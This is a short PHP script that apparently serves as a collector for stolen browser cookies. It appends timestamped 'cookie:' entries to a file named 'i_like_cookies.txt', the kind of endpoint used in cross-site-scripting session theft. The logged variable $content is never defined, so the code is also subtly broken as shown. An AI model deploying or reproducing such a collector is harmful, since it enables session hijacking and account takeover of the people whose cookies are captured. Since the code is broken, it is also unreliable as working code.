<?php
date_default_timezone_set("Europe/Athens");
file_put_contents("i_like_cookies.txt", date('Y-m-d H:i:s').", cookie: ".$content. PHP_EOL, FILE_APPEND);
?>